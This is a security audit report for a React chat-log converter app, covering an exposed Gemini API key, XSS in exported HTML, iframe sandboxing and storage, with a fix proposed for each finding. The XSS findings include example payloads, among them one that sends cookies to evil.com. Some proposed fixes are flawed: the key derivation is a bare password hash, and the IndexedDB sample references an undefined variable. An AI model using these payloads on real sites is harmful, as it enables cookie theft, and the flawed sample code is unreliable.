# Security & Code Quality Audit Report

**Date:** January 4, 2026
**Scope:** IndexedDB implementation, storage layer, converters, and React components
**Status:** Reviewed and documented

---

## Executive Summary

The codebase has **multiple critical and high-severity security vulnerabilities** that need immediate attention before production deployment. The most critical issues involve API key exposure, XSS vulnerabilities, and weak sandbox configurations. The IndexedDB implementation itself is sound, but the surrounding code and data handling practices pose significant risks.

**Critical Issues Found:** 3
**High-Severity Issues:** 6
**Medium-Severity Issues:** 7
**Low-Severity Issues:** 5

---

## CRITICAL FINDINGS

### 🔴 1. Gemini API Key Exposed in Client Bundle

**Files:**
- `vite.config.ts` (lines 18-21)
- `AIConverter.tsx` (line 48)
- `converterService.ts` (line 44)

**Severity:** CRITICAL

**Issue:**
```typescript
// vite.config.ts - API key injected into bundle
define: {
  'process.env.GEMINI_API_KEY': JSON.stringify(env.GEMINI_API_KEY)
}

// converterService.ts - Key embedded directly in URL
const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash-exp:generateContent?key=${apiKey}`, {
```

**Why This Is Critical:**
- API key is visible in browser DevTools (F12 → Sources/Network)
- URL appears in browser history, HTTP headers, and server logs
- Proxies and CDNs may cache the URL containing the key
- Anyone can use the exposed key to make unauthorized API calls, incurring costs and consuming quota
- Gemini API key breach is equivalent to handing attackers full access to your AI service

**Impact:**
- Unauthorized API usage and billing
- Service disruption
- User data processing without consent (if key is stolen and used by others)

**Recommendation:**
```typescript
// Option A: Backend proxy (RECOMMENDED)
// Create a backend endpoint that handles Gemini API calls
const response = await fetch('/api/parse-with-ai', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ input: userInput })
  // API key stays on backend, never exposed to client
});

// Option B: If you must keep client-side, use authenticated proxies
// like cors-anywhere or auth0 token-based access
```

**Timeline:** Fix immediately before any public deployment

---

### 🔴 2. Unescaped User Input Leading to XSS in Generated HTML

**Files:**
- `converterService.ts` (lines 1090-1118, 692-698)
- `BasicConverter.tsx` (lines 358-359)
- `MetadataEditor.tsx` (lines 89, 12-30)

**Severity:** CRITICAL

**Issues:**

#### 2.1 Unescaped Speaker Names & Titles
```typescript
// converterService.ts - NO ESCAPING of user input
const speakerName = isPrompt ? userName : aiName;
return `
  <div class="...">
    <p class="font-semibold...">${speakerName}</p>  // ⚠️ XSS VULNERABLE
    <div>${contentHtml}</div>
  </div>
`;

// Later in HTML generation:
<h1 class="text-4xl...">${title}</h1>  // ⚠️ XSS VULNERABLE
```

**Attack Example:**
```
User enters userName as: <img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">

Generated HTML becomes:
<p class="font-semibold..."><img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)"></p>

When exported or viewed, the JavaScript executes in the browser
```

#### 2.2 Unescaped Markdown Formatting
```typescript
// converterService.ts - Bold/Italic/Links NOT escaped
text = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');  // $1 NOT escaped
text = text.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>');  // $1, $2 NOT escaped

// Attack:
// Input: **<script>alert('XSS')</script>**
// Output: <strong><script>alert('XSS')</script></strong>
```

#### 2.3 Unescaped Image URLs
```typescript
text = text.replace(/!\[([^\]]+)\]\(([^)]+)\)/g, '<img src="$2" alt="$1" />');  // $1, $2 NOT escaped

// Attack:
// Input: ![alt](javascript:alert('XSS'))
// Output: <img src="javascript:alert('XSS')" alt="alt" />
```

**Impact:**
- Malicious users can inject JavaScript that executes in viewers' browsers
- Could steal cookies, perform keylogging, redirect to malware sites
- Affects everyone who opens exported HTML files
- Downloaded HTML files bypass browser XSS protections

**Recommendation:**
```typescript
// Create HTML escaping utility
const escapeHtml = (text: string): string => {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, (char) => map[char]);
};

// OR use a library like DOMPurify for more robust sanitization

// Then use in HTML generation:
const speakerName = escapeHtml(isPrompt ? userName : aiName);
return `
  <p class="...">${speakerName}</p>
`;

// For markdown conversion, escape BEFORE processing:
const contentHtml = convertMarkdownToHtml(escapeHtml(content));
```

**Timeline:** Fix before any user-generated content is exported

---

### 🔴 3. Weak iframe Sandbox Configuration Enables Code Injection

**Files:**
- `BasicConverter.tsx` (line 634)
- `GeneratedHtmlDisplay.tsx` (lines 49-54)

**Severity:** CRITICAL (when combined with XSS)

**Issues:**
```typescript
// BasicConverter.tsx - Too permissive
<iframe
  srcDoc={generatedHtml}
  sandbox="allow-scripts"  // ⚠️ Allows arbitrary JS
/>

// GeneratedHtmlDisplay.tsx - Even worse
<iframe
  srcDoc={htmlContent}
  sandbox="allow-scripts allow-same-origin allow-popups"  // ⚠️ Multiple vulnerabilities
/>
```

**Why This Matters:**
- `allow-scripts` permits JavaScript execution inside iframe
- If XSS payload makes it into the HTML, it executes unchecked
- `allow-same-origin` allows iframe to:
  - Access parent window's cookies
  - Read localStorage/IndexedDB
  - Access parent's DOM
  - Make requests with parent's credentials
- `allow-popups` allows malicious redirects

**Combined Attack Scenario:**
1. User enters `<script>alert('test')</script>` as userName
2. HTML is generated with unescaped userName
3. User opens preview in iframe
4. JavaScript executes due to `allow-scripts`
5. With `allow-same-origin`, attacker can read IndexedDB chat data and send it elsewhere

**Recommendation:**
```typescript
// MINIMUM sandboxing (most secure)
<iframe
  srcDoc={generatedHtml}
  sandbox=""  // Disables all; good if no interactivity needed
  title="Preview"
/>

// If you need SOME interactivity but user-generated content:
<iframe
  srcDoc={generatedHtml}
  sandbox="allow-same-origin"  // Allow styling only, NOT scripts
  title="Preview"
/>

// NEVER combine allow-scripts with allow-same-origin for untrusted content
```

---

## HIGH-SEVERITY FINDINGS

### 🟠 4. No Input Validation on File Uploads (DoS Risk)

**File:** `BasicConverter.tsx` (lines 152-164)

**Severity:** HIGH

**Issue:**
```typescript
const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
  const file = e.target.files?.[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = (event) => {
    if (event.target?.result) {
      setInputContent(event.target.result as string);  // ⚠️ No size check
    }
  };
  reader.readAsText(file);
};
```

**Problems:**
- No file size validation: User could upload 1GB file, causing browser to hang
- No file type validation: Binary files could be loaded as text
- No encoding validation: Corrupt files could cause parsing errors
- Accept attribute exists but can be bypassed client-side

**Attack:**
- Attacker uploads 500MB file → Browser memory exhaustion → Tab crashes
- Malicious or corrupt file → Parsing errors not gracefully handled

**Recommendation:**
```typescript
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB
const ALLOWED_TYPES = ['text/plain', 'application/json', 'text/markdown'];

const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
  const file = e.target.files?.[0];
  if (!file) return;

  // Size validation
  if (file.size > MAX_FILE_SIZE) {
    setError(`File must be smaller than ${MAX_FILE_SIZE / 1024 / 1024}MB`);
    return;
  }

  // Type validation
  if (!ALLOWED_TYPES.includes(file.type)) {
    setError('Only text, JSON, and Markdown files are allowed');
    return;
  }

  const reader = new FileReader();
  reader.onload = (event) => {
    if (typeof event.target?.result === 'string') {
      setInputContent(event.target.result);
    }
  };
  reader.onerror = () => {
    setError('Failed to read file');
  };
  reader.readAsText(file);
};
```

---

### 🟠 5. Unvalidated Metadata & Tags (Input Validation)

**File:** `MetadataEditor.tsx` (lines 12-30, 89)

**Severity:** HIGH

**Issues:**
```typescript
const handleAddTag = (e: React.KeyboardEvent) => {
  if (e.key === 'Enter' && tagInput.trim()) {
    e.preventDefault();
    if (!metadata.tags.includes(tagInput.trim())) {
      onChange({
        ...metadata,
        tags: [...metadata.tags, tagInput.trim()]  // ⚠️ No validation
      });
    }
    setTagInput('');
  }
};

// And URL field:
<input
  type="url"
  value={metadata.sourceUrl || ''}
  onChange={(e) => onChange({ ...metadata, sourceUrl: e.target.value })}  // ⚠️ No validation
/>
```

**Problems:**
- Tags have no length limits → Storage bloat
- Tags have no character restrictions → Could contain HTML/special chars
- No limit on number of tags → Attacker could add 10,000 tags
- URL field not validated → Invalid URLs accepted
- Could cause XSS if tags rendered without escaping elsewhere

**Recommendation:**
```typescript
const MAX_TAG_LENGTH = 50;
const MAX_TAGS = 10;
const TAG_PATTERN = /^[a-zA-Z0-9_-]+$/;  // Alphanumeric, hyphen, underscore only

const handleAddTag = (e: React.KeyboardEvent) => {
  if (e.key === 'Enter' && tagInput.trim()) {
    e.preventDefault();
    const tag = tagInput.trim();

    // Validate tag
    if (tag.length === 0 || tag.length > MAX_TAG_LENGTH) {
      setError(`Tags must be 1-${MAX_TAG_LENGTH} characters`);
      return;
    }

    if (!TAG_PATTERN.test(tag)) {
      setError('Tags can only contain letters, numbers, hyphens, and underscores');
      return;
    }

    if (metadata.tags.length >= MAX_TAGS) {
      setError(`Maximum ${MAX_TAGS} tags allowed`);
      return;
    }

    if (!metadata.tags.includes(tag)) {
      onChange({ ...metadata, tags: [...metadata.tags, tag] });
      setTagInput('');
      setError(null);
    }
  }
};

// URL validation
const handleSourceUrlChange = (url: string) => {
  if (!url) {
    onChange({ ...metadata, sourceUrl: '' });
    return;
  }

  try {
    new URL(url);  // Will throw if invalid
    onChange({ ...metadata, sourceUrl: url });
    setError(null);
  } catch {
    setError('Invalid URL format');
  }
};
```

---

### 🟠 6. Chat Title XSS Vulnerability

**File:** `BasicConverter.tsx` (lines 358-359)

**Severity:** HIGH

**Issue:**
```typescript
<input
  type="text"
  value={chatTitle}
  onChange={(e) => setChatTitle(e.target.value)}  // ⚠️ No length limit, no escaping
/>
```

**Attack:**
```
User enters: <img src=x onerror="alert('xss')">
When exported to HTML: <h1 class="..."><img src=x onerror="alert('xss')"></h1>
JavaScript executes when file is opened
```

**Recommendation:**
```typescript
const MAX_TITLE_LENGTH = 200;

<input
  type="text"
  value={chatTitle}
  maxLength={MAX_TITLE_LENGTH}
  onChange={(e) => setChatTitle(e.target.value.slice(0, MAX_TITLE_LENGTH))}
  placeholder="Enter chat title"
/>
```

---

### 🟠 7. Weak Session ID Generation

**File:** `BasicConverter.tsx` (line 211)

**Severity:** HIGH

**Issue:**
```typescript
const newSession: SavedChatSession = {
  id: Date.now().toString(),  // ⚠️ Not guaranteed unique
  // ...
};
```

**Problem:**
- Two saves at the exact same millisecond = ID collision
- Predictable IDs (sequential timestamps)
- Could overwrite existing sessions if collision occurs

**Recommendation:**
```typescript
import { v4 as uuidv4 } from 'uuid';

const newSession: SavedChatSession = {
  id: uuidv4(),  // Cryptographically random, guaranteed unique
  // ...
};
```

**Add to package.json:**
```json
"dependencies": {
  "uuid": "^9.0.0"
}
```

---

### 🟠 8. Incomplete HTML Entity Escaping in Code Blocks

**File:** `converterService.ts` (line 895)

**Severity:** HIGH

**Issue:**
```typescript
const codeBlockContent = ...replace(/</g, '&lt;').replace(/>/g, '&gt;');  // Missing &
```

**Problem:**
- Only escapes `<` and `>`
- Missing `&` escape (must be first!)
- Could produce malformed HTML entities

**Example:**
```
If content contains: &copy;
After escaping <,>: &copy; (unchanged)
But if content later references it: &amp;copy; should be &#169;
Incomplete escaping creates confusing output
```

**Recommendation:**
```typescript
const escapeHtml = (text: string): string => {
  const map: Record<string, string> = {
    '&': '&amp;',    // MUST be first
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, (char) => map[char]);
};

const codeBlockContent = escapeHtml(rawContent);
```

---

## MEDIUM-SEVERITY FINDINGS

### 🟡 9. No Content Security Policy (CSP)

**File:** `converterService.ts` (lines 1131-1135)

**Severity:** MEDIUM

**Issue:**
```typescript
const html = `
  <!DOCTYPE html>
  <html>
    <head>
      <script src="https://cdn.tailwindcss.com"></script>
      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
    </head>
```

**Problem:**
- External scripts loaded without CSP headers
- No protection against unauthorized scripts being injected
- Malicious CDN compromise could inject code into all generated files

**Recommendation:**
```typescript
const html = `
  <!DOCTYPE html>
  <html>
    <head>
      <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://cdn.tailwindcss.com https://cdn.jsdelivr.net; style-src 'unsafe-inline';">
      <script src="https://cdn.tailwindcss.com"></script>
      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
    </head>
`;
```

---

### 🟡 10. Silent Failure in Storage Operations

**File:** `ArchiveHub.tsx` (lines 23-33)

**Severity:** MEDIUM

**Issue:**
```typescript
const loadSessions = async () => {
  try {
    const allSessions = await storageService.getAllSessions();
    setSessions(allSessions.sort(...));
  } catch (e) {
    console.error('Failed to load sessions', e);  // Only logs to console
    // No user-facing error, no state update
  }
};
```

**Problem:**
- Users don't know why hub is empty (could be IndexedDB failure, not empty archive)
- No retry mechanism
- Silent failures confuse users

**Recommendation:**
```typescript
const [error, setError] = useState<string | null>(null);

const loadSessions = async () => {
  try {
    const allSessions = await storageService.getAllSessions();
    setSessions(allSessions.sort(...));
    setError(null);
  } catch (e) {
    console.error('Failed to load sessions', e);
    setError('Unable to load archived sessions. Please refresh the page.');
  }
};

// In JSX:
{error && (
  <div className="bg-red-900/30 border border-red-700 p-4 rounded mb-4">
    {error}
  </div>
)}
```

---

### 🟡 11. No Input Size Limits (DoS Risk)

**File:** `converterService.ts` (line 40)

**Severity:** MEDIUM

**Issue:**
```typescript
const prompt = `...${input.substring(0, 30000)}...`;
```

**Problems:**
- Hardcoded limit with no validation before reaching this point
- User could paste 1MB of text in textarea
- AI parsing could timeout
- Text area has no maxLength attribute

**Recommendation:**
```typescript
const MAX_INPUT_SIZE = 100000;  // 100KB max
const MAX_TEXTAREA_ROWS = 100;

// In AIConverter.tsx:
<textarea
  value={inputContent}
  onChange={(e) => {
    if (e.target.value.length <= MAX_INPUT_SIZE) {
      setInputContent(e.target.value);
    }
  }}
  rows={Math.min(20, Math.max(5, inputContent.split('\n').length))}
  maxLength={MAX_INPUT_SIZE}
  placeholder="Paste your chat log here..."
/>

// In converterService.ts:
if (input.length > MAX_INPUT_SIZE) {
  throw new Error(`Input exceeds maximum size of ${MAX_INPUT_SIZE} characters`);
}
```

---

### 🟡 12. Missing JSON Schema Validation

**File:** `converterService.ts` (lines 107-127)

**Severity:** MEDIUM

**Issue:**
```typescript
const chatMessages: ChatMessage[] = messagesArray.map((msg: any) => {
  if (!msg.type || !msg.content) {
    throw new Error('...');
  }
  // No further validation - accepts ANY string values
  return {
    type: type as ChatMessageType,
    content: `${msg.content}`,  // Could be 10MB string!
  };
});
```

**Problems:**
- No length limits on message content
- No type validation (accept any string for type field)
- No structure validation (could have malicious properties)

**Recommendation:**
```typescript
interface ValidatedMessage {
  type: ChatMessageType;
  content: string;
}

const validateMessage = (msg: unknown): ValidatedMessage => {
  if (!msg || typeof msg !== 'object') {
    throw new Error('Message must be an object');
  }

  const { type, content } = msg as Record<string, unknown>;

  // Type validation
  if (typeof type !== 'string') {
    throw new Error('Message type must be a string');
  }
  if (!['prompt', 'response'].includes(type.toLowerCase())) {
    throw new Error('Message type must be "prompt" or "response"');
  }

  // Content validation
  if (typeof content !== 'string') {
    throw new Error('Message content must be a string');
  }
  if (content.length === 0 || content.length > 50000) {
    throw new Error('Message content must be 1-50000 characters');
  }

  return {
    type: type.toLowerCase() as ChatMessageType,
    content: content.trim()
  };
};

const chatMessages: ChatMessage[] = messagesArray.map(validateMessage);
```

---

### 🟡 13. Unencrypted IndexedDB Storage

**File:** `storageService.ts` (entire file)

**Severity:** MEDIUM

**Issue:**
```typescript
// Data stored as plaintext in IndexedDB
const request = store.put(session);  // session object serialized as-is
```

**Problem:**
- Chat content visible in browser's IndexedDB (DevTools → Application → IndexedDB)
- No encryption at rest
- Anyone with browser access can read all conversations
- No user authentication/isolation

**Recommendation:**
```typescript
// Install crypto library
// npm install tweetnacl-js

import nacl from 'tweetnacl';
import { encodeUTF8, decodeUTF8 } from 'tweetnacl-util';

class EncryptedStorageService {
  private encryptionKey: Uint8Array;

  constructor(password: string) {
    // Derive key from password
    this.encryptionKey = nacl.hash(encodeUTF8(password)).slice(0, 32);
  }

  async saveSession(session: SavedChatSession): Promise<void> {
    const plaintext = JSON.stringify(session);
    const nonce = nacl.randomBytes(24);

    const encrypted = nacl.secretbox(
      encodeUTF8(plaintext),
      nonce,
      this.encryptionKey
    );

    const ciphertext = {
      nonce: Array.from(nonce),
      encrypted: Array.from(encrypted)
    };

    // Store encrypted object
    const db = await this.getDB();
    const transaction = db.transaction(STORE_NAME, 'readwrite');
    const store = transaction.objectStore(STORE_NAME);
    store.put({ id: session.id, ...ciphertext });
  }

  async getSessionById(id: string): Promise<SavedChatSession | undefined> {
    const db = await this.getDB();
    const transaction = db.transaction(STORE_NAME, 'readonly');
    const store = transaction.objectStore(STORE_NAME);

    return new Promise((resolve) => {
      const request = store.get(id);
      request.onsuccess = () => {
        const result = request.result;
        if (!result) return resolve(undefined);

        const decrypted = nacl.secretbox.open(
          new Uint8Array(result.encrypted),
          new Uint8Array(result.nonce),
          this.encryptionKey
        );

        if (!decrypted) return resolve(undefined);
        resolve(JSON.parse(decodeUTF8(decrypted)));
      };
    });
  }
}
```

---

## LOW-SEVERITY FINDINGS

### 🔵 14. Type Safety Issues

**Files:**
- `converterService.ts` (line 115)
- `BasicConverter.tsx` (line 159)

**Severity:** LOW

**Issues:**
```typescript
// Using 'any' type
const chatMessages: ChatMessage[] = messagesArray.map((msg: any) => {

// Using type assertion without checks
setInputContent(event.target.result as string);
```

**Recommendation:**
```typescript
interface ParsableMessage {
  type: unknown;
  content: unknown;
  [key: string]: unknown;
}

const chatMessages: ChatMessage[] = messagesArray.map((msg: ParsableMessage) => {
  // Proper validation now required due to interface
  if (typeof msg.type !== 'string') throw new Error(...);
  if (typeof msg.content !== 'string') throw new Error(...);
  // ...
});

// Type-safe file reading
reader.onload = (event) => {
  const result = event.target?.result;
  if (typeof result === 'string') {
    setInputContent(result);
  }
};
```

---

### 🔵 15. Verbose Error Messages

**File:** `converterService.ts` (lines 54-55, 67)

**Severity:** LOW

**Issue:**
```typescript
const err = await response.text();
throw new Error(`Gemini API Error: ${response.status} - ${err}`);
```

**Problem:**
- API error responses displayed to users
- Could leak internal API information
- Rate limit details visible to users

**Recommendation:**
```typescript
if (!response.ok) {
  console.error(`API Error: ${response.status}`, error_response);

  // Show generic user-friendly error
  if (response.status === 429) {
    throw new Error('Too many requests. Please try again in a few minutes.');
  } else if (response.status === 401) {
    throw new Error('API authentication failed. Please check configuration.');
  } else {
    throw new Error('Failed to process your request. Please try again.');
  }
}
```

---

### 🔵 16. Race Conditions in Async Operations

**File:** `BasicConverter.tsx` (lines 207-230)

**Severity:** LOW

**Issue:**
```typescript
useEffect(() => {
  const init = async () => {
    await storageService.migrateLegacyData();
    const sessions = await storageService.getAllSessions();
    setSavedSessions(sessions);  // ⚠️ Could be stale if component unmounts
  };
  init();
}, [loadSession]);
```

**Problem:**
- If component unmounts before async completes, setState warns about memory leak
- Multiple calls could race and overwrite each other

**Recommendation:**
```typescript
useEffect(() => {
  let isMounted = true;

  const init = async () => {
    await storageService.migrateLegacyData();
    const sessions = await storageService.getAllSessions();
    if (isMounted) {  // Only update if still mounted
      setSavedSessions(sessions);
    }
  };

  init();

  return () => {
    isMounted = false;  // Cleanup on unmount
  };
}, []);
```

---

### 🔵 17. No Error Boundary Component

**Severity:** LOW

**Issue:**
- No React Error Boundary to catch render errors
- One component error crashes entire app

**Recommendation:**
```typescript
// src/components/ErrorBoundary.tsx
class ErrorBoundary extends React.Component<
  { children: React.ReactNode },
  { hasError: boolean }
> {
  constructor(props: { children: React.ReactNode }) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError() {
    return { hasError: true };
  }

  componentDidCatch(error: Error, errorInfo: React.ErrorInfo) {
    console.error('Error caught:', error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="flex items-center justify-center min-h-screen bg-gray-900">
          <div className="text-center">
            <h1 className="text-4xl font-bold text-red-600 mb-4">Something went wrong</h1>
            <button
              onClick={() => window.location.reload()}
              className="bg-blue-600 px-4 py-2 rounded"
            >
              Reload Page
            </button>
          </div>
        </div>
      );
    }
    return this.props.children;
  }
}

// Use in App.tsx:
<ErrorBoundary>
  <Router>
    {/* routes */}
  </Router>
</ErrorBoundary>
```

---

## INDEXEDDB-SPECIFIC FINDINGS

### ✅ What's Working Well

1. **Clean Abstraction Layer** - `StorageService` provides good API
2. **Proper Transaction Handling** - All operations use correct IndexedDB transaction patterns
3. **Migration Path** - Legacy localStorage data properly migrated
4. **No SQL Injection** - Not applicable; IndexedDB uses API, not query language
5. **Atomic Operations** - Individual saves/deletes are atomic

### ⚠️ What Needs Improvement

1. **No Encryption** - Data stored plaintext (addressed above)
2. **No Concurrency Control** - Multiple tabs could cause conflicts
3. **No Backup/Export** - No way to export IndexedDB for backup
4. **No Schema Versioning** - V1 only; future changes will need migration logic
5. **No Quota Management** - No warning when approaching browser storage limits

### Recommendation for IndexedDB Enhancement

```typescript
class StorageService {
  private db: IDBDatabase | null = null;

  // Add quota checking
  async checkQuota(): Promise<{ usage: number; quota: number; percentUsed: number }> {
    if (!navigator.storage?.estimate) {
      return { usage: 0, quota: 0, percentUsed: 0 };
    }

    const { usage = 0, quota = 0 } = await navigator.storage.estimate();
    return {
      usage,
      quota,
      percentUsed: quota > 0 ? (usage / quota) * 100 : 0
    };
  }

  // Add export for backup
  async exportAll(): Promise<string> {
    const sessions = await this.getAllSessions();
    return JSON.stringify(sessions, null, 2);
  }

  // Add import from backup
  async importAll(jsonData: string): Promise<number> {
    const sessions = JSON.parse(jsonData) as SavedChatSession[];

    for (const session of sessions) {
      await this.saveSession(session);
    }

    return sessions.length;
  }

  // Add schema versioning for future
  private async getDB(): Promise<IDBDatabase> {
    if (this.db) return this.db;

    return new Promise((resolve, reject) => {
      const request = indexedDB.open(DB_NAME, 2);  // Version 2

      request.onupgradeneeded = (event) => {
        const db = (event.target as IDBOpenDBRequest).result;

        // V1 → V2: Add encryption-ready schema
        if (!db.objectStoreNames.contains(STORE_NAME)) {
          db.createObjectStore(STORE_NAME, { keyPath: 'id' });
        }

        // Could add indexes here for future queries
        // const store = event.currentTarget as IDBObjectStore;
        // store.createIndex('date', 'metadata.date', { unique: false });
      };

      request.onsuccess = () => {
        this.db = (event.target as IDBOpenDBRequest).result;
        resolve(this.db);
      };

      request.onerror = () => {
        reject((event.target as IDBOpenDBRequest).error);
      };
    });
  }
}
```

---

## Priority Action Items

### 🔴 DO IMMEDIATELY (Before Any Public Release)

1. **[CRITICAL]** Move Gemini API calls to backend server
2. **[CRITICAL]** Add HTML escaping utility and apply to all user-generated content
3. **[CRITICAL]** Remove `allow-scripts` from iframe sandbox configurations
4. **[HIGH]** Add file upload validation (size + type)
5. **[HIGH]** Add metadata validation (tags, URL, title length)
6. **[HIGH]** Use UUID for session IDs instead of `Date.now()`

### 🟠 DO SOON (Before Beta Release)

7. Add CSP headers to generated HTML
8. Implement proper error handling and user feedback
9. Add input size limits with user warnings
10. Implement JSON schema validation
11. Add encryption to IndexedDB storage

### 🟡 DO EVENTUALLY (Nice to Have)

12. Add Error Boundary component
13. Improve type safety (remove `any` types)
14. Add storage quota monitoring
15. Implement backup/export functionality

---

## Testing Checklist

After implementing fixes, verify:

- [ ] API key not visible in browser DevTools
- [ ] `<script>alert('xss')</script>` in any field doesn't execute
- [ ] File upload rejects files > 10MB
- [ ] Tags with special characters are rejected
- [ ] Invalid URLs in sourceUrl are rejected
- [ ] Two rapid saves don't create duplicate sessions
- [ ] iframe preview shows content without executing scripts
- [ ] IndexedDB encryption works (test with DevTools)
- [ ] Error messages are user-friendly, not leaking information
- [ ] Large file uploads don't crash browser tab

---

## Conclusion

The IndexedDB implementation itself is sound and well-abstracted. However, the security vulnerabilities are in the surrounding code - specifically input handling, HTML generation, and API key management. These are all fixable issues, but they need attention before production use.

**Recommendation:** Fix all CRITICAL and HIGH items before public release. The application is currently not suitable for handling sensitive user data in production.
